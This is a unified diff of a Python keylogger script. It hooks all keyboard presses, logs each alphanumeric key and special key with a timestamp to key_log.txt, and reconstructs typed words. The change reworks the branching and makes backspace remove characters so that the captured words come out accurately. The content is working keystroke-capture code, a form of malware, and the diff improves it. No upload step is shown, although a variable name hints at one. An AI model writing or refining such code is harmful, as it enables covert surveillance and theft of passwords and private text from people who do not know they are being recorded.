@@ -5,19 +5,14 @@ import os
 GIST_FILENAME = "key_log.txt"
 current_word = []
 
-# Function to log each key press and complete words
+# Function to log key presses and complete words
 def log_key(e):
     global current_word
     current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Log individual key presses
-    if e.name not in ['space', 'enter', 'tab', 'backspace']:
-        with open(GIST_FILENAME, "a") as f:
-            f.write(f"{current_time} - Key Press: {e.name}\n")
-        current_word.append(e.name)
-    else:
+    if e.name in ['space', 'enter', 'tab', 'backspace']:
         if current_word:
-            # Log the completed word when space or punctuation is pressed
+            # Log the completed word
             with open(GIST_FILENAME, "a") as f:
                 word = ''.join(current_word).strip()
                 if word:
@@ -35,8 +30,17 @@ def log_key(e):
             with open(GIST_FILENAME, "a") as f:
                 f.write(f"{current_time} - Key Press: TAB\n")
         elif e.name == 'backspace':
+            # Log the backspace action
             with open(GIST_FILENAME, "a") as f:
                 f.write(f"{current_time} - Key Press: BACKSPACE\n")
+            if current_word:
+                current_word.pop()  # Remove last character from the word
+
+    elif len(e.name) == 1 and e.name.isalnum():
+        # Log alphanumeric key presses and build words
+        with open(GIST_FILENAME, "a") as f:
+            f.write(f"{current_time} - Key Press: {e.name}\n")
+        current_word.append(e.name)
 
 # Listen for all key presses
 keyboard.on_press(log_key)
